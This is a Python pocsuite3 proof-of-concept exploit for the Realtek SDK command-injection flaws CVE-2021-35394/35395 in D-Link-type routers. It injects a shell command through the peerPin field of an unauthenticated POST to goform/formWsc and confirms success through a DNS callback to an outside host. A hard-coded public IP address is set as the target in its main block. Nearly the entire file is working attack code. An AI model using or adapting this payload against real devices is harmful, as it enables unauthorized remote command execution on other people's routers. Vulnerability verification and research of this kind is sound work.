from urllib.parse import urljoin, quote

import requests
from pocsuite3.api import logger
from pocsuite3.api import register_poc,POCBase
from pocsuite3.modules import DnsEcho


class Poc(POCBase):
    name = 'Realtek SDK 多个未授权严重漏洞(CVE-2021-35394&CVE-2021-35395)'
    appName = "DLink"
    vulDate = "2021-02-02"
    cve = 'CVE-2021-35395'
    verify = False

    def _verify(self):
        dns_echo = DnsEcho()
        url = urljoin(self.url, "goform/formWsc")
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        command = "ping -c 1 {}".format(dns_echo.get_dns())
        logger.debug(command)
        data = f"submit-url=%2Fwlwps.asp&resetUnCfg=0&peerPin=12345678;{command};&setPIN=Start+PIN&configVxd=off&resetRptUnCfg=0&peerRptPin="
        requests.post(url, data=data, headers=headers, timeout=12)
        if dns_echo.check_dns():
            return self.parse_output({"VerifyInfo": {"URL": url}})


register_poc(Poc)

if __name__ == "__main__":
    import os

    os.environ.setdefault('http_proxy', 'http://127.0.0.1:10808')
    os.environ.setdefault('https_proxy', 'http://127.0.0.1:10808')
    poc = Poc()
    poc.set_option("url", "http://104.200.25.171:9444")
    poc.execute(mode="verify")
